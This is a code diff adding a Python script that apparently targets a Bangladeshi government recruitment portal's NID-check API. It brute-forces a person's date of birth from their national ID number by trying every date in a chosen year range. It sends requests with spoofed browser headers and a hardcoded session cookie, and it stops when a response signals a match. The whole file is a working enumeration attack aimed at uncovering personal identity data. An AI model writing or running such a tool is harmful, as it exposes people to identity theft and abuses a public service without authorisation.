@@ -1,0 +1,68 @@
+import requests
+import json
+from datetime import datetime
+from colorama import Fore, Style, init
+
+# Initialize colorama
+init(autoreset=True)
+
+# Taking user input
+nid = str(input("What is the NID No:-- "))
+start_year = int(input("Enter the start year for DOB: "))
+end_year = int(input("Enter the end year for DOB: "))
+
+url = "https://api.bdansarerp.gov.bd/api/check_nid_data/"
+
+headers = {
+    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+    'Accept': "application/json, text/plain, */*",
+    'Accept-Encoding': "gzip, deflate, br, zstd",
+    'sec-ch-ua-platform': "\"Android\"",
+    'sec-ch-ua': "\"Not(A:Brand\";v=\"99\", \"Android WebView\";v=\"133\", \"Chromium\";v=\"133\"",
+    'sec-ch-ua-mobile': "?1",
+    'Origin': "https://recruitment.bdansarerp.gov.bd",
+    'X-Requested-With': "mark.via.gp",
+    'Sec-Fetch-Site': "same-site",
+    'Sec-Fetch-Mode': "cors",
+    'Sec-Fetch-Dest': "empty",
+    'Referer': "https://recruitment.bdansarerp.gov.bd/",
+    'Accept-Language': "en-US,en;q=0.9",
+    'Cookie': "connect.sid=s%3AhhM0Tc1KN6gwoLcyNvUXXO7JcR_pUQVw.cmJ9ODKNjQZu8339OM5HANn98K9Xej5SVr83uQsPnSI"
+}
+
+# Iterating through possible date combinations
+for year in range(start_year, end_year + 1):  # Using user input for year range
+    for month in range(1, 13):  # Months 1-12
+        for day in range(1, 32):  # Days 1-31 (handling invalid dates later)
+            try:
+                dob = f"{year:04d}-{month:02d}-{day:02d}"  # Formatting DOB
+                params = {
+                    'nid': nid,
+                    'dob': dob
+                }
+
+                response = requests.get(url, params=params, headers=headers)
+                response_data = response.json()
+
+                response_code = response_data.get("responseCode")
+
+                print(f"Trying DOB: {dob} -> Response Code: {response_code}")
+
+                if response_code is None:
+                    print(Fore.GREEN + "Successfully")
+                    print(Fore.GREEN + f"NID No:-- {nid}")
+                    print(Fore.GREEN + f"DOB No:-- {dob}")
+                    exit()  # Exit when response_code is None
+
+                if response_code == "SUCCESS":  # Adjust based on actual success response
+                    print(f"Valid DOB found: {dob}")
+                    print(f"NID No: {nid}")
+                    print(Fore.GREEN + Style.BRIGHT + f"Successfully processed! DOB No: {dob}")
+                    exit()  # Stop execution if a valid DOB is found
+            except ValueError:
+                # Handle JSON decode error or other exceptions
+                print(f"Invalid date format or other error for DOB: {dob}")
+            except requests.exceptions.RequestException as e:
+                # Handle request exceptions
+                print(f"Request failed for DOB: {dob}. Error: {e}")
+
